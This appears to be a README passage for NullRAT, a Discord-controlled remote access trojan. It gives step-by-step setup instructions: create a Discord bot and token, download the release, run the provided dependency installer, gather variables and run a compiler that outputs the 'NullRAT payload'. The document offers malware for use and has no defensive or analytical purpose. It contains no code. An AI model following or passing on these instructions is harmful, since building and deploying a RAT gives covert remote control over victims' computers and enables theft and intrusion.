## How to use:
<h4>Preparation:</h4>

- Python 3.8+ should be installed on the PC (Tick "Add to PATH" while installing)
- **Do not under any circumstances use the Microsoft Store version of Python, does not work**
- Add PIP folder to path as well (`%APPDATA%\Python\{insert python folder}\Scripts`)

<h4>IMPORTANT:</h4>
Using the provided Dependencies Installer and Compiler is the key to success. 

Only people who know what they're doing should not use the compiler. I won't help anyone who does.

<h4>Steps:</h4>

- [Create a Discord BOT and obtain it's token](https://www.freecodecamp.org/news/create-a-discord-bot-with-python/)
- [**IMPORTANT**] Create invite link for the bot using the following scopes: `bot`, `application.commands`
- Dowload the latest release of NullRAT (git cloning/download zip will no longer work)
- Run the Dependencies Installer which will install all the necessary dependencies (except Python)
- Before running the compiler, read [Getting Variables.md](https://github.com/NullCode1337/NullRAT/blob/source/Getting%20Variables.md) and grab all the variables you need
- Run the Compiler, and feed it all the necessary information. NullRAT payload will be right there!

Also it'd be nice if you could ‚≠ê NullRAT (it's free, and motivates me to work on it more)
